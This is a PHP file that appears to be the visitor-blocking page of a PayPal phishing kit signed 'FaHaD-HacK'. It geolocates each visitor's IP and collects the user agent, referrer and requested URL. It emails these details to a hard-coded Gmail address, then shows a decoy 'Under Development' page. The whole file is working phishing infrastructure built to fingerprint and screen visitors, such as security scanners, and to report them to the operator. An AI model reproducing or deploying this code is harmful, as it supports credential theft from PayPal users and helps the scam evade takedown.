<?php
// GET Country & Country CODE !
#################################################
########      Design by FaHaD            ########
#################################################


    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $countrycode = $ip_data->geoplugin_countryCode;
        $_SESSION['cntcode'] = $countrycode;
    }
    
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
        $_SESSION['cntname'] = $countryname;
    }


#END
// srt msg

$ip = getenv ("REMOTE_ADDR");
$_SESSION['gmmans'] = $ip;
$_SESSION['hreeffed'] = $hrfd;
$requri = getenv ("REQUEST_URI");
$servname = getenv ("SERVER_NAME");
$httpref = getenv ("HTTP_REFERER");
$httpagent = getenv ("HTTP_USER_AGENT");
$today = date("D M j Y g:i:s a T");

$to = "fahad.iraq09@gmail.com";
$subject = "[Forbidden] Block ip - [ $countryname - $ip ]";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Forbidden@mailfahad.com\r\n";
$message .= "

<div>

========================================</font><br />
    PayPal Forbidden - FaHaD-HacK !</font><br />
========================================</font><br />
Client Form  : ".$countryname."</font><br />
Tried  Load  : ".$servname.$requri."</font><br />
Client Agent : ".$httpagent."</font><br />
Client Source: ".$httpagent."".$httpref."</font><br />
Client iP    : http://www.geoiptool.com/?IP=".$ip."</font><br />
Client iP 2  : https://ipinfo.io/".$ip."</font><br />
========================================</font><br />

		
</font></div>";
@mail($to,$subject,$message,$headers);

//end msg
?>

<html><head>
<title>Under Development</title>
</head><body><div align="center">
<img src="/UnderDevelopment.jpg" style="display:block;margin:0px 9px;background-color:#f1f1f1;" border="0" alt="">
</div>
</body></html>